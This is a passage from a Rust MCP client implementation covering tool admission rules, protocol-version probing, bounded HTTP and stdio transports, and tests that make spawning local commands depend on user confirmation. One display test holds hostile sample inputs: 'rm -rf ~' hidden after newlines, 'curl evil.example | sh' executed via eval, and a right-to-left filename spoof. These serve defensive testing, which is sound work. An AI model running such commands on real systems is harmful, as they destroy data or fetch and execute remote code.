                        .ok_or_else(|| anyhow!("connect failed: {}", id))?
                }
            }
        };
        let mut guard = live.live.lock().map_err(|_| anyhow!("conn lock"))?;
        admit_tool(&spec, &guard.tools, tool)?;
        let out = rpc_raw(
            &mut guard,
            &spec,
            self.next_id(),
            "tools/call",
            json!({ "name": tool, "arguments": arguments }),
        )?;
        if out.get("resultType").and_then(|r| r.as_str()) == Some("input_required") {
            return Err(anyhow!("tools/call: server asked for input (resultType input_required); interactive server results are not supported"));
        }
        Ok(out)
    }
}

/// 壳侧准入(与页面 admitExternalTool 同规则):工具必须在该服务器 tools/list 宣告过;
/// 只读档(read_only_only=true,缺省):只放行「annotations.readOnlyHint===true」的工具,allow_tools **不**放行写工具;
/// 按清单档:readOnlyHint 或「在 allow_tools 清单」二者居一(页面把清单里的写工具按写入级注册、走审批)。
/// 此前只有页面判、直呼壳命令可绕过 —— 令牌持有者=受信本机进程,但只增不删的目录承诺要在最后一跳也成立。
/// 此前两档条件完全相同(开关只改拒绝文案),只读档下清单里的写工具照样被放行。
fn admit_tool(spec: &ServerSpec, tools: &[Value], name: &str) -> Result<()> {
    let Some(t) = tools
        .iter()
        .find(|t| t.get("name").and_then(|n| n.as_str()) == Some(name))
    else {
        return Err(anyhow!("tool not listed by server: {}", name));
    };
    let read_only = t
        .get("annotations")
        .and_then(|a| a.get("readOnlyHint"))
        .and_then(|v| v.as_bool())
        == Some(true);
    let listed = spec.allow_tools.iter().any(|a| a == name);
    if read_only {
        return Ok(());
    }
    if spec.read_only_only {
        return Err(anyhow!(
            "tool not admitted: {} (no readOnlyHint; read-only mode ignores the allow list{})",
            name,
            if listed {
                ", switch to allow-list mode to admit write tools"
            } else {
                ""
            }
        ));
    }
    if listed {
        return Ok(());
    }
    Err(anyhow!(
        "tool not admitted: {} (no readOnlyHint and not in allow list; read-only restriction is off, list it explicitly)",
        name
    ))
}

/// `Mcp-Name` 头取值:tools/call 与 prompts/get 取 params.name,resources/read 取 params.uri,其余方法不带。
fn mcp_name_for(method: &str, req: &Value) -> Option<String> {
    let params = req.get("params")?;
    match method {
        "tools/call" | "prompts/get" => params
            .get("name")
            .and_then(|n| n.as_str())
            .map(|s| s.to_string()),
        "resources/read" => params
            .get("uri")
            .and_then(|n| n.as_str())
            .map(|s| s.to_string()),
        _ => None,
    }
}

/// 按纪元发一次请求:现代 = params 注 `_meta`、HTTP 加三头、不带会话;旧 = 今日字节。回 result;JSON-RPC error 转成 Err。
fn rpc_raw(
    live: &mut Live,
    spec: &ServerSpec,
    id: u64,
    method: &str,
    params: Value,
) -> Result<Value> {
    let (req, modern) = match &live.era {
        Era::Modern(v) => {
            let mut p = match params {
                Value::Object(m) => m,
                _ => serde_json::Map::new(),
            };
            p.insert("_meta".to_string(), modern_meta(v));
            (
                json!({ "jsonrpc": "2.0", "id": id, "method": method, "params": Value::Object(p) }),
                Some(v.clone()),
            )
        }
        Era::Legacy => (
            json!({ "jsonrpc": "2.0", "id": id, "method": method, "params": params }),
            None,
        ),
    };
    let raw = match (&mut live.conn, modern) {
        (
            Conn::Http {
                client,
                url,
                headers,
                session,
            },
            None,
        ) => http_rpc(client, url, headers, session, &req, spec.timeout())?,
        (
            Conn::Http {
                client,
                url,
                headers,
                ..
            },
            Some(v),
        ) => {
            let name = mcp_name_for(method, &req);
            http_rpc_modern(
                client,
                url,
                headers,
                &req,
                spec.timeout(),
                &v,
                method,
                name.as_deref(),
            )?
        }
        (Conn::Stdio { stdin, rx, child }, _) => {
            stdio_rpc(stdin, rx, child, &req, id, spec.timeout())?
        }
    };
    if let Some(err) = raw.get("error") {
        let msg = err
            .get("message")
            .and_then(|m| m.as_str())
            .unwrap_or("external error");
        return Err(anyhow!("{}: {}", method, msg));
    }
    Ok(raw.get("result").cloned().unwrap_or(json!({})))
}

/// 旧纪元通知(无 id、不等回体);现代纪元没有 initialized 通知,不会走到这里。
fn notify_raw(live: &mut Live, spec: &ServerSpec, method: &str, params: Value) -> Result<()> {
    let req = json!({ "jsonrpc": "2.0", "method": method, "params": params });
    match &mut live.conn {
        Conn::Http {
            client,
            url,
            headers,
            session,
        } => {
            let mut b = client
                .post(url.as_str())
                .timeout(spec.timeout())
                .header("Content-Type", "application/json")
                .header("Accept", "application/json, text/event-stream")
                .header("MCP-Protocol-Version", PROTOCOL_VERSION);
            for (k, v) in headers.iter() {
                b = b.header(k.as_str(), v.as_str());
            }
            if let Some(s) = session.as_ref() {
                b = b.header("Mcp-Session-Id", s.as_str());
            }
            let _ = b.body(req.to_string()).send();
        }
        Conn::Stdio { stdin, .. } => {
            stdin.send_line(&req.to_string());
        }
    }
    Ok(())
}

/// 纪元探测:以现代形态发 `server/discover`。现代服务器 ⇒ 200 DiscoverResult(取 supportedVersions 交集;无交集 ⇒ Err 不回退)
/// 或 400/404 + JSON 现代错误码(-32022 取 data.supported 交集;-32020/-32021 ⇒ Err);旧服务器 ⇒ 400 纯文本 / -32601 / -32602 /
/// 探测超时 ⇒ Legacy(回退 initialize)。传输层致命错误(回体超限 / 子进程退出 / stdout 关闭 / 输出被拒)原样上抛,不伪装成旧纪元。
fn probe_era(conn: &mut Conn, spec: &ServerSpec, id: u64) -> Result<Era> {
    let timeout = spec.timeout().min(DISCOVER_PROBE_TIMEOUT);
    let mut params = serde_json::Map::new();
    params.insert("_meta".to_string(), modern_meta(MODERN_PROTOCOL_VERSION));
    let req = json!({ "jsonrpc": "2.0", "id": id, "method": "server/discover", "params": Value::Object(params) });
    let attempt = match conn {
        Conn::Http {
            client,
            url,
            headers,
            ..
        } => http_rpc_modern(
            client,
            url,
            headers,
            &req,
            timeout,
            MODERN_PROTOCOL_VERSION,
            "server/discover",
            None,
        ),
        Conn::Stdio { stdin, rx, child } => stdio_rpc(stdin, rx, child, &req, id, timeout),
    };
    match attempt {
        Ok(raw) => classify_discover(&raw),
        Err(e) => {
            let m = e.to_string();
            let fatal = [
                "too large",
                "process exited",
                "stdout closed",
                "output rejected",
            ];
            if fatal.iter().any(|f| m.contains(f)) {
                Err(e)
            } else {
                Ok(Era::Legacy)
            }
        }
    }
}

/// 把 server/discover 的回体分类成纪元(纯函数,便于向量测试)。
pub fn classify_discover(raw: &Value) -> Result<Era> {
    fn versions(v: Option<&Value>) -> Vec<String> {
        v.and_then(|x| x.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|x| x.as_str().map(|s| s.to_string()))
                    .collect()
            })
            .unwrap_or_default()
    }
    if let Some(result) = raw.get("result").filter(|r| r.is_object()) {
        let supported = versions(result.get("supportedVersions"));
        if supported.is_empty() || supported.iter().any(|v| v == MODERN_PROTOCOL_VERSION) {
            return Ok(Era::Modern(MODERN_PROTOCOL_VERSION.to_string()));
        }
        return Err(anyhow!("no common protocol version: server supports {:?}, this client speaks {} (or {} via initialize)", supported, MODERN_PROTOCOL_VERSION, PROTOCOL_VERSION));
    }
    if let Some(err) = raw.get("error") {
        let code = err.get("code").and_then(|c| c.as_i64()).unwrap_or(0);
        let msg = err.get("message").and_then(|m| m.as_str()).unwrap_or("");
        return match code {
            -32020 | -32021 => Err(anyhow!(
                "server/discover rejected by a {} server ({}): {}",
                MODERN_PROTOCOL_VERSION,
                code,
                msg
            )),
            -32022 => {
                let supported = versions(err.get("data").and_then(|d| d.get("supported")));
                if supported.iter().any(|v| v == MODERN_PROTOCOL_VERSION) {
                    Ok(Era::Modern(MODERN_PROTOCOL_VERSION.to_string()))
                } else {
                    Err(anyhow!(
                        "no common protocol version: server supports {:?}, this client speaks {}",
                        supported,
                        MODERN_PROTOCOL_VERSION
                    ))
                }
            }
            _ => Ok(Era::Legacy),
        };
    }
    Ok(Era::Legacy)
}

fn open_conn(spec: &ServerSpec) -> Result<Conn> {
    match &spec.transport {
        Transport::Http { url, headers } => {
            if !url.starts_with("http://") && !url.starts_with("https://") {
                return Err(anyhow!("http transport requires http(s) url"));
            }
            let parsed = reqwest::Url::parse(url)
                .map_err(|_| anyhow!("http transport requires http(s) url"))?;
            // 自定义头(通常就是令牌)绝不明文发往别的机器:非本机回环的 http:// 地址带头一律拒连,请改用 https://
            if parsed.scheme() == "http"
                && !headers.is_empty()
                && !crate::mcp_stdio::url_host_is_loopback(&parsed)
            {
                return Err(anyhow!(
                    "refusing to send custom headers over plain http to a non-loopback host: use https://"
                ));
            }
            let mut builder = reqwest::blocking::Client::builder()
                .timeout(spec.timeout())
                // 不跟随重定向:自定义头不能被 3xx 带去别的主机(3xx 按上游 HTTP 错误报出)
                .redirect(reqwest::redirect::Policy::none());
            // 本机回环上的服务一律直连:环境里的 HTTP(S)_PROXY / ALL_PROXY 不能把本机请求送进代理
            if crate::mcp_stdio::url_host_is_loopback(&parsed) {
                builder = builder.no_proxy();
            }
            let client = builder.build()?;
            Ok(Conn::Http {
                client,
                url: url.clone(),
                headers: headers.clone(),
                session: None,
            })
        }
        Transport::Stdio {
            command,
            args,
            env,
            cwd,
        } => {
            if command.trim().is_empty() {
                return Err(anyhow!("stdio transport requires a command"));
            }
            let mut cmd = Command::new(command);
            cmd.args(args)
                .envs(env)
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::null());
            // 自成进程组:断开时连同它派生的进程一起杀(见 kill_child)
            #[cfg(unix)]
            {
                use std::os::unix::process::CommandExt;
                cmd.process_group(0);
            }
            if let Some(d) = cwd.as_ref().filter(|d| !d.trim().is_empty()) {
                cmd.current_dir(d);
            }
            let mut child = cmd.spawn().with_context(|| format!("spawn {}", command))?;
            let stdin = child.stdin.take().ok_or_else(|| anyhow!("no stdin"));
            let stdout = child.stdout.take().ok_or_else(|| anyhow!("no stdout"));
            let child = Arc::new(Mutex::new(child));
            // 后面任何一步失败都要把刚起的子进程收掉
            let (stdin, stdout) = match (stdin, stdout) {
                (Ok(i), Ok(o)) => (i, o),
                (Err(e), _) | (_, Err(e)) => {
                    kill_child(&child);
                    return Err(e);
                }
            };
            let stdin = match StdinWriter::spawn(stdin) {
                Ok(w) => w,
                Err(e) => {
                    kill_child(&child);
                    return Err(e);
                }
            };
            let (tx, rx) = mpsc::channel::<String>();
            thread::spawn(move || {
                let mut reader = BufReader::new(stdout);
                loop {
                    // 有界逐行读:一行超过 MAX_RESPONSE_BYTES 即判死(发一条错误帧后退出),
                    // 不再「整块吃进内存再静默丢弃」——3MB 无换行的输出此前会先整块进内存,调用方只等到超时。
                    match read_line_bounded(&mut reader, MAX_RESPONSE_BYTES) {
                        Ok(None) => break,
                        Ok(Some(l)) => {
                            if tx.send(l).is_err() {
                                break;
                            }
                        }
                        Err(e) => {
                            let _ = tx.send(format!("{}{}", READER_ERROR_PREFIX, e));
                            break;
                        }
                    }
                }
            });
            Ok(Conn::Stdio { child, stdin, rx })
        }
    }
}

/// 读线程遇到不可恢复错误(超长行等)时发给调用方的哨兵行前缀:stdio_rpc 据此立刻报错,而不是等到超时。
const READER_ERROR_PREFIX: &str = "\u{0}__horosa_reader_error__:";

/// 有界读一行(不含行尾换行):`Ok(None)`=EOF;单行超过 `cap` 字节 → `Err("line too large")`。
/// 用 `Take` 把单次 read_until 钉死在 cap+1 字节:超长行永远不会整块进内存。
fn read_line_bounded<R: BufRead>(reader: &mut R, cap: usize) -> Result<Option<String>> {
    let mut buf: Vec<u8> = Vec::new();
    let n = reader.take(cap as u64 + 1).read_until(b'\n', &mut buf)?;
    if n == 0 {
        return Ok(None);
    }
    // 读满 cap+1 字节仍没见到换行 = 这一行超过上限(恰好 cap 字节 + '\n' 的行合法)
    if buf.len() > cap && !buf.ends_with(b"\n") {
        return Err(anyhow!("line too large (> {} bytes)", cap));
    }
    let mut s = String::from_utf8_lossy(&buf).to_string();
    while s.ends_with('\n') || s.ends_with('\r') {
        s.pop();
    }
    Ok(Some(s))
}

/// 一次 HTTP POST 往返(有界读):回 (状态码, content-type, 正文)。`extra` 在 Content-Type/Accept 之后、自定义头之前注入;
/// `use_session` 为真时带 Mcp-Session-Id 并在回包里刷新(旧纪元);现代纪元传假(永不带会话头,也不认回包里的会话头)。
fn http_exchange(
    client: &reqwest::blocking::Client,
    url: &str,
    headers: &HashMap<String, String>,
    session: &mut Option<String>,
    use_session: bool,
    req: &Value,
    timeout: Duration,
    extra: &[(&str, String)],
) -> Result<(u16, String, String)> {
    let mut b = client
        .post(url)
        .timeout(timeout)
        .header("Content-Type", "application/json")
        .header("Accept", "application/json, text/event-stream");
    for (k, v) in extra.iter() {
        b = b.header(*k, v.as_str());
    }
    for (k, v) in headers.iter() {
        b = b.header(k.as_str(), v.as_str());
    }
    if use_session {
        if let Some(s) = session.as_ref() {
            b = b.header("Mcp-Session-Id", s.as_str());
        }
    }
    let resp = b.body(req.to_string()).send()?;
    if use_session {
        if let Some(sid) = resp
            .headers()
            .get("mcp-session-id")
            .and_then(|h| h.to_str().ok())
        {
            *session = Some(sid.to_string());
        }
    }
    let status = resp.status().as_u16();
    let ctype = resp
        .headers()
        .get("content-type")
        .and_then(|h| h.to_str().ok())
        .unwrap_or("")
        .to_lowercase();
    // 有界读:最多读 MAX_RESPONSE_BYTES+1 字节即判超限——一台只发 5MiB 就挂住不关闭的服务器不能让客户端等到超时、也不能让内存不设防
    let mut bytes: Vec<u8> = Vec::new();
    resp.take(MAX_RESPONSE_BYTES as u64 + 1)
        .read_to_end(&mut bytes)?;
    if bytes.len() > MAX_RESPONSE_BYTES {
        return Err(anyhow!(
            "response too large (> {} bytes)",
            MAX_RESPONSE_BYTES
        ));
    }
    Ok((status, ctype, String::from_utf8_lossy(&bytes).to_string()))
}

/// 旧纪元请求(线上字节同今日):MCP-Protocol-Version 2025-06-18 + 会话头;非 2xx 一律报 HTTP 码。
fn http_rpc(
    client: &reqwest::blocking::Client,
    url: &str,
    headers: &HashMap<String, String>,
    session: &mut Option<String>,
    req: &Value,
    timeout: Duration,
) -> Result<Value> {
    let extra = [("MCP-Protocol-Version", PROTOCOL_VERSION.to_string())];
    let (status, ctype, text) =
        http_exchange(client, url, headers, session, true, req, timeout, &extra)?;
    if !(200..300).contains(&status) {
        return Err(anyhow!("upstream HTTP {}", status));
    }
    if ctype.contains("text/event-stream") {
        return sse_first_json(&text, req.get("id").cloned());
    }
    serde_json::from_str::<Value>(&text).map_err(|e| anyhow!("bad JSON from server: {}", e))
}

/// 现代纪元请求:三头(版本 / Mcp-Method / Mcp-Name 哨兵编码)+ 无会话;400/404 带 JSON 体(-32020/-32022/-32601)原样回给调用方判定,
/// 非 JSON 的错误状态才报 HTTP 码(旧服务器对 server/discover 的 400 纯文本走这里 ⇒ 探测判旧纪元)。
fn http_rpc_modern(
    client: &reqwest::blocking::Client,
    url: &str,
    headers: &HashMap<String, String>,
    req: &Value,
    timeout: Duration,
    version: &str,
    method: &str,
    name: Option<&str>,
) -> Result<Value> {
    let mut extra: Vec<(&str, String)> = vec![
        ("MCP-Protocol-Version", version.to_string()),
        ("Mcp-Method", method.to_string()),
    ];
    if let Some(n) = name {
        extra.push(("Mcp-Name", encode_header_value(n)));
    }
    let mut no_session: Option<String> = None;
    let (status, ctype, text) = http_exchange(
        client,
        url,
        headers,
        &mut no_session,
        false,
        req,
        timeout,
        &extra,
    )?;
    if ctype.contains("text/event-stream") {
        return sse_first_json(&text, req.get("id").cloned());
    }
    if let Ok(v) = serde_json::from_str::<Value>(&text) {
        if v.is_object() {
            return Ok(v);
        }
    }
    if !(200..300).contains(&status) {
        return Err(anyhow!("upstream HTTP {}", status));
    }
    Err(anyhow!("bad JSON from server"))
}

/// SSE 回体:逐 `data:` 行取第一条 id 匹配的 JSON-RPC 响应(通知/其它 id 一律跳过)。
pub fn sse_first_json(body: &str, want_id: Option<Value>) -> Result<Value> {
    for line in body.lines() {
        let Some(rest) = line.strip_prefix("data:") else {
            continue;
        };
        let payload = rest.trim();
        if payload.is_empty() {
            continue;
        }
        let Ok(v) = serde_json::from_str::<Value>(payload) else {
            continue;
        };
        if v.get("id").is_none() {
            continue;
        }
        match &want_id {
            Some(w) if v.get("id") != Some(w) => continue,
            _ => return Ok(v),
        }
    }
    Err(anyhow!("no matching JSON-RPC response in event stream"))
}

fn stdio_rpc(
    stdin: &StdinWriter,
    rx: &mpsc::Receiver<String>,
    child: &Mutex<Child>,
    req: &Value,
    want_id: u64,
    timeout: Duration,
) -> Result<Value> {
    if let Some(status) = child_exited(child) {
        return Err(anyhow!("server process exited ({})", status));
    }
    let deadline = Instant::now() + timeout;
    // 写也算进同一个超时预算:对方不读 stdin 时不再无限期卡住调用线程
    if let Err(e) = stdin.write_line(&req.to_string(), deadline) {
        // 写了半行的管道已破坏逐行分帧,这条连接作废:杀进程,下次调用如实报「进程已退出」
        kill_child(child);
        return Err(e);
    }
    while Instant::now() < deadline {
        let left = deadline.saturating_duration_since(Instant::now());
        match rx.recv_timeout(left.min(Duration::from_millis(500))) {
            Ok(line) => {
                if let Some(err) = line.strip_prefix(READER_ERROR_PREFIX) {
                    return Err(anyhow!("server output rejected: {}", err));
                }
                let Ok(v) = serde_json::from_str::<Value>(&line) else {
                    continue;
                };
                if v.get("id").and_then(|i| i.as_u64()) == Some(want_id) {
                    return Ok(v);
                }
            }
            Err(mpsc::RecvTimeoutError::Timeout) => {
                if let Some(status) = child_exited(child) {
                    return Err(anyhow!("server process exited ({})", status));
                }
            }
            Err(mpsc::RecvTimeoutError::Disconnected) => {
                return Err(anyhow!("server stdout closed"))
            }
        }
    }
    Err(anyhow!("timeout waiting for server response"))
}

/// 退出臂:断所有连接(杀子进程);永不阻塞主线程 —— 摘表是一瞬的事,杀进程与回收丢后台线程
/// (子进程句柄锁被占的一瞬也不在主线程上等)。
pub fn stop_on_exit(state: &ClientState) {
    let entries = state.take_all();
    if entries.is_empty() {
        return;
    }
    let spawned = thread::Builder::new()
        .name("mcp-client-exit".into())
        .spawn(move || {
            for entry in entries {
                entry.kill();
            }
        });
    if let Err(e) = spawned {
        crate::ledger_mark(
            "rust.mcp_client_exit_cleanup_failed",
            Some(json!({ "error": e.to_string() })),
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Read;
    use std::net::{Shutdown, TcpListener, TcpStream};

    /// `HOROSA_MCP_CLIENT` 是**进程级**全局:改它的用例与依赖它的用例必须共用这把锁,
    /// 否则 cargo test 的并行线程会在别人外呼到一半时把总开关抽走(假红)。
    static ENV_GUARD: Mutex<()> = Mutex::new(());

    fn env_guard() -> std::sync::MutexGuard<'static, ()> {
        ENV_GUARD
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner())
    }

    fn http_spec(id: &str, url: &str, timeout_ms: u64) -> ServerSpec {
        ServerSpec {
            id: id.into(),
            name: id.into(),
            enabled: true,
            transport: Transport::Http {
                url: url.into(),
                headers: HashMap::new(),
            },
            timeout_ms,
            allow_tools: vec![],
            read_only_only: true,
        }
    }

    /// 测试用:确认器一律允许(起本机命令的闸另有专门用例)
    fn test_state() -> ClientState {
        ClientState::with_stdio_confirm(Arc::new(|_: &str, _: &str| true))
    }

    /// 🔴 起本机命令必须先经用户确认:没确认器 / 确认器拒 ⇒ 不 spawn(子进程的标记文件不出现);
    /// 允许过的指纹不再问;命令 / 参数 / 环境任一改动 ⇒ 重新问;允许记录落盘、换进程照认;http 规格不问
    #[test]
    fn stdio_spawn_requires_confirmation_and_rechecks_on_change() {
        let dir = std::env::temp_dir().join(format!(
            "horosa-mcpapprove-{}-{}",
            std::process::id(),
            line!()
        ));
        let _ = std::fs::create_dir_all(&dir);
        let mark = dir.join("spawned.mark");
        let spec = stdio_spec(
            "s",
            "/bin/sh",
            vec!["-c".into(), format!("touch '{}'; exec cat", mark.display())],
            1500,
        );
        // ① 没有确认器(缺省)= 一律不起
        let bare = ClientState::default();
        bare.upsert(spec.clone()).unwrap();
        let e = bare.connect("s").expect_err("未经确认必须拒");
        assert!(format!("{e:#}").contains("未经确认"), "{e:#}");
        thread::sleep(Duration::from_millis(150));
        assert!(!mark.exists(), "拒绝时不得 spawn");
        // ② 确认器拒 → 不起;确认器看到的是完整命令行
        let seen = Arc::new(Mutex::new(Vec::<String>::new()));
        let seen2 = seen.clone();
        let deny = ClientState::with_stdio_confirm(Arc::new(move |_n: &str, d: &str| {
            seen2.lock().unwrap().push(d.to_string());
            false
        }));
        deny.bind_dir(&dir);
        deny.upsert(spec.clone()).unwrap();
        assert!(deny.connect("s").is_err());
        thread::sleep(Duration::from_millis(150));
        assert!(!mark.exists(), "用户拒绝时不得 spawn");
        assert!(
            seen.lock().unwrap()[0].contains("/bin/sh -c"),
            "{:?}",
            seen.lock().unwrap()
        );
        // ③ 允许一次 → 起;同一条再连不再问
        let asks = Arc::new(AtomicU64::new(0));
        let asks2 = asks.clone();
        let allow = ClientState::with_stdio_confirm(Arc::new(move |_n: &str, _d: &str| {
            asks2.fetch_add(1, Ordering::SeqCst);
            true
        }));
        allow.bind_dir(&dir);
        allow.upsert(spec.clone()).unwrap();
        let _ = allow.connect("s"); // cat 不是 MCP 服务器:握手会超时报错,但进程已按允许起来
        assert!(mark.exists(), "允许后应 spawn");
        let _ = allow.connect("s");
        assert_eq!(asks.load(Ordering::SeqCst), 1, "同一条命令只问一次");
        allow.disconnect("s");
        // ④ 允许记录落盘:换一个进程(新 state)照认,不再问也能起
        let _ = std::fs::remove_file(&mark);
        let reload = ClientState::with_stdio_confirm(Arc::new(|_n: &str, _d: &str| false));
        reload.bind_dir(&dir);
        let _ = reload.connect("s");
        assert!(mark.exists(), "已允许过的命令换进程照认");
        reload.disconnect("s");
        // ⑤ 页面改了参数(一次 IPC)→ 指纹变 → 重新问,拒了就不起
        let _ = std::fs::remove_file(&mark);
        let mut changed = spec.clone();
        if let Transport::Stdio { args, .. } = &mut changed.transport {
            args.push("--extra".into());
        }
        reload.upsert(changed).unwrap();
        assert!(reload.connect("s").is_err());
        thread::sleep(Duration::from_millis(150));
        assert!(!mark.exists(), "改过的命令未确认不得 spawn");
        // ⑥ 环境变量改了同样重问;显示里名字像密钥的值不露
        let mut with_env = spec.clone();
        if let Transport::Stdio { env, .. } = &mut with_env.transport {
            env.insert("API_TOKEN".into(), "sekrit-value".into());
            env.insert("MODE".into(), "x".into());
        }
        assert_ne!(stdio_fingerprint(&with_env), stdio_fingerprint(&spec));
        let disp = stdio_command_display(&with_env);
        assert!(
            disp.contains("API_TOKEN=(已隐藏")
                && !disp.contains("sekrit-value")
                && disp.contains("MODE=x"),
            "{disp}"
        );
        // ⑦ http 规格不起本机进程,不问
        assert!(stdio_fingerprint(&http_spec("h", "http://127.0.0.1:1/mcp", 100)).is_none());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// 🔴 确认框的显示不可伪装:换行 / 双向控制 / 零宽字符一律转义成可见形式,过长参数截断并注明总长;
    /// 名字像密钥的环境变量:值像令牌才隐藏(显示长度与 sha256 前 8 位),值含空白 / 符号的原样显示;命令行引用了就注明
    #[test]
    fn stdio_display_escapes_hidden_chars_and_flags_env_payloads() {
        let long = "a".repeat(1000);
        let mut spec = stdio_spec(
            "d",
            "/bin/sh",
            vec![
                "-c".into(),
                "echo ok\n\n\n\n\n\nrm -rf ~".into(),
                "safe\u{202E}txt.exe".into(),
                "zero\u{200B}width".into(),
                long.clone(),
                "back\\nslash".into(),
            ],
            1000,
        );
        if let Transport::Stdio { env, .. } = &mut spec.transport {
            env.insert("API_KEY".into(), "curl evil.example | sh".into());
            env.insert("API_TOKEN".into(), "sk-abcDEF123456".into());
            env.insert("MODE".into(), "x".into());
        }
        if let Transport::Stdio { args, .. } = &mut spec.transport {
            args.push("eval \"$API_KEY\"".into());
        }
        let disp = stdio_command_display(&spec);
        let first = disp.lines().next().unwrap_or("");
        for bad in ['\u{202E}', '\u{200B}'] {
            assert!(
                !disp.contains(bad),
                "显示里不许有原样的不可见字符 {:?}:{disp}",
                bad
            );
        }
        assert!(
            first.contains("rm -rf ~"),
            "换行后的载荷必须与命令同一行可见:{first}"
        );
        assert!(first.contains("echo ok\\n\\n"), "{first}");
        assert!(
            first.contains("\\u{202E}") && first.contains("\\u{200B}"),
            "{first}"
        );
        assert!(
            first.contains("back\\\\nslash"),
            "字面反斜杠要与真换行可区分:{first}"
        );
        assert!(
            first.contains("共 1000 个字符") && !first.contains(&long),
            "过长参数截断并注明总长:{first}"
        );
        assert!(
            disp.contains("API_KEY='curl evil.example | sh'") && disp.contains("不像令牌"),
            "{disp}"
        );
        assert!(disp.contains("命令行引用了这个变量"), "{disp}");
        assert!(
            !disp.contains("sk-abcDEF123456")
                && disp.contains("API_TOKEN=(已隐藏:15 个字符,sha256 前 8 位 "),
            "{disp}"
        );
        assert!(disp.contains("MODE=x"), "{disp}");
        assert_eq!(display_escape("普通 中文 path/a.b"), "普通 中文 path/a.b");
    }

    /// 🔴 AI 间接调用(call)遇到没连上的本机命令:指纹没确认过 ⇒ 直接报错、不弹确认框、不 spawn;
    /// 用户在面板点「连接」才弹;确认过之后,掉线后的 AI 调用可以静默重连(不再问)
    #[test]
    fn ai_call_never_prompts_for_unapproved_stdio() {
        let _guard = env_guard();
        let dir = std::env::temp_dir().join(format!(
            "horosa-mcpnoprompt-{}-{}",
            std::process::id(),
            line!()
        ));
        let _ = std::fs::create_dir_all(&dir);
        let mark = dir.join("spawned.mark");
        let _ = std::fs::remove_file(&mark);
        let asks = Arc::new(AtomicU64::new(0));
        let asks2 = asks.clone();
        let state = ClientState::with_stdio_confirm(Arc::new(move |_n: &str, _d: &str| {
            asks2.fetch_add(1, Ordering::SeqCst);
            true
        }));
        let spec = stdio_spec(
            "np",
            "/bin/sh",
            vec!["-c".into(), format!("touch '{}'; exec cat", mark.display())],
            600,
        );
        state.upsert(spec).unwrap();
        let e = state
            .call("np", "get_time", json!({}))
            .expect_err("未确认的命令不许由 AI 调用拉起");
        assert!(format!("{e:#}").contains("面板"), "{e:#}");
        thread::sleep(Duration::from_millis(150));
        assert_eq!(asks.load(Ordering::SeqCst), 0, "AI 调用不得弹确认框");
        assert!(!mark.exists(), "AI 调用不得 spawn 未确认的命令");
        let _ = state.connect("np"); // 用户点连接:弹一次(cat 不是 MCP 服务器,握手超时,但指纹已确认)
        assert_eq!(asks.load(Ordering::SeqCst), 1);
        assert!(mark.exists());
        state.disconnect("np"); // 模拟掉线
        thread::sleep(Duration::from_millis(100));
        let _ = std::fs::remove_file(&mark);
        let _ = state.call("np", "get_time", json!({})); // 确认过:AI 调用可以重连,不再问
        assert_eq!(asks.load(Ordering::SeqCst), 1, "确认过的命令重连不再问");
        assert!(mark.exists(), "确认过的命令允许自动重连");
        state.disconnect("np");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// 🔴 upsert 改了命令 / 参数 / 环境:旧连接立刻断开(回包 disconnected=true),之后的 AI 调用不会连到没确认过的新命令;
    /// 只改超时等非传输字段不断开
    #[test]
    fn upsert_changing_command_disconnects_old_connection() {
        let _guard = env_guard();
        let script = stdio_script(&[
            ("*'\"method\":\"server/discover\"'*", "\"error\":{\"code\":-32601,\"message\":\"Method not found\"}"),
            ("*'\"method\":\"initialize\"'*", "\"result\":{\"protocolVersion\":\"2025-06-18\",\"serverInfo\":{\"name\":\"up\"}}"),
            ("*'\"method\":\"tools/list\"'*", "\"result\":{\"tools\":[{\"name\":\"get_time\",\"inputSchema\":{\"type\":\"object\"},\"annotations\":{\"readOnlyHint\":true}}]}"),
            ("*'\"method\":\"tools/call\"'*", "\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"ok\"}],\"isError\":false}"),
        ]);
        let asks = Arc::new(AtomicU64::new(0));
        let asks2 = asks.clone();
        let state = ClientState::with_stdio_confirm(Arc::new(move |_n: &str, _d: &str| {
            asks2.fetch_add(1, Ordering::SeqCst);
            true
        }));
        let spec = stdio_spec("up", "/bin/sh", vec!["-c".into(), script], 3000);
        state.upsert(spec.clone()).unwrap();
        state.connect("up").expect("连上假 stdio 服务");
        assert_eq!(state.list()[0]["connected"], true);
        let mut slower = spec.clone();
        slower.timeout_ms = 4000;
        let out = state.upsert(slower.clone()).unwrap();
        assert_eq!(out["disconnected"], false, "只改超时不断开");
        assert_eq!(state.list()[0]["connected"], true);
        let mut changed = slower.clone();
        if let Transport::Stdio { args, .. } = &mut changed.transport {
            args.push("--changed".into());
        }
        let out = state.upsert(changed).unwrap();
        assert_eq!(out["disconnected"], true, "改了命令必须断开旧连接");
        assert_eq!(state.list()[0]["connected"], false);
        assert!(state.conns.lock().unwrap().get("up").is_none());
        let e = state
            .call("up", "get_time", json!({}))
            .expect_err("改过的命令没确认,AI 调用不许连");
        assert!(format!("{e:#}").contains("面板"), "{e:#}");
        assert_eq!(asks.load(Ordering::SeqCst), 1, "只有用户点连接那一次问过");
    }

    fn stdio_spec(id: &str, command: &str, args: Vec<String>, timeout_ms: u64) -> ServerSpec {
        ServerSpec {
            id: id.into(),
            name: id.into(),
            enabled: true,
            transport: Transport::Stdio {
                command: command.into(),
                args,
                env: HashMap::new(),
                cwd: None,
            },
            timeout_ms,
            allow_tools: vec![],
            read_only_only: true,
        }
    }

    /// 假服务器的回体形态。
    #[derive(Clone, Copy)]
    enum BodyPlan {
        /// 一条正常的小 JSON-RPC 回体(id 恒 1)
        SmallJson,
        /// 声明一个远超 `MAX_RESPONSE_BYTES` 的 Content-Length,只发 `bytes` 字节就**挂住不关闭**
        StalledOversize { bytes: usize },
        /// 同上,但发完 `bytes` 字节后**半关闭**写端(客户端读到提前 EOF)
        HalfClosed { bytes: usize },
    }

    /// 敌意 HTTP 服务器(裸 `TcpListener`,不经任何 HTTP 库):
    /// 可以延迟发头、可以发超大体、可以半关闭。回 base url;监听线程随进程结束。
    fn slow_http_server(delay_ms: u64, body: BodyPlan) -> String {
        let listener = TcpListener::bind("127.0.0.1:0").expect("bind 127.0.0.1:0");
        let port = listener.local_addr().expect("local_addr").port();
